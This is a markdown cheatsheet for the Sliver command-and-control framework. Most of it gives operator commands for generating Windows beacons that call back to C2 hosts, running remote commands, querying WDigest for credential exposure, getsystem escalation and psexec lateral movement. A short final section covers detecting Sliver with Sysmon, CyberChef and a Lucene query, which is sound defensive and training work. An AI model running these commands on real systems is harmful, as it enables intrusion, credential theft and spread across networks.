# Sliver Cheatsheet

[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/)
```go
// Depending on install
// Sometime not ideal... issues..
sudo sliver
sudo su - ; /root/sliver-server

// Display help
help <command>

// For multi-client
multiplayer 
new-operator
// Connect with Client

// View all implants
implants
// Generate Beacons and Sessions
generate
// Choice one C2 endpoint using:
// --wg is wireguard 
--mtls --wg --http --dns
// Session are sessions opsec unsafe
generate --mtls domain.com --os windows --save 
// Beacons are asychronous - more opsec way they sleep and check 
generate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows --save /path/to/directory
// Regenerate
regenerate
// listeners
// Do not accept interfaces as arguemnts like metasploit
mtls -L <lhost> -l <lport> 
wg
https
http
dns
// Jobs to view and manage listners
jobs
jobs -k <job number>
jobs -K <kill all jobs> // -F for force
// Beacons
// Show all beacons, information and checkin time
beacons 
// Show all bbeacno tasks - task are FIFO
tasks
// Drop down to select with arrow keys
use 
// Interact with sessions
use <id >// Create an interactive sessions
// Inrteract with a session
session -i $id
// CReate interactive session from beacon and wait
interactive
execute -o <command>
execute -o icacls "c:\Windows\Temp"
// reg query the WDIGEST
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential

// Armory
// Within a sessions run a armory package eg:
seatbelt -h
sharpup audit

// Shell
Shell // Comes with an OPSec warning by default for good reason
// Exit shell, be patient wait 30 seconds
exit

// With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
getsystem

// psexec is embedded into sliver good for lateral movement
psexec --profile BEACON <hostname>
```

Armory
```go
// Because why not
armory install all 
```

Shellcode generation
```go
// Disable shikata ga nai
-f shellcode -G
```

## Detecting Sliver

Sliver beacon detection:
```powershell 
# Requires Sysmon2
# look for default nomanclature, but this is easily customised -save /path/name.exe
WORD_WORD.exe 

powershell.exe -NoExit -Command[Console]::OutputEncoding=[Text:UTF8Encoding]:UTF8
# by default uses spool.svc to getsystem 
spool.svc
```

`Cyberchef` -> `Regular Expresssion -> Regex: Sliver`  then upload file that you suspect is a Sliver binary. Make sure you set the recipe first or you will crash your browser.

```json
// Language MUST BE: lucene
event.code:8 AND winlog.event_data.TargetImage:(*spoolsv*) AND winlog.event_data.TargetUser:(*
NT* AND *AUTHORITY\\SYSTEM*)
```
## References

[Official Armory](https://github.com/BishopFox/sliver/wiki/Armory#the-official-armory)
[dominicbreuker - Stagers](https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)
[Really Good Cyber attack & defense video](https://www.youtube.com/watch?v=izMMmOaLn9g) , 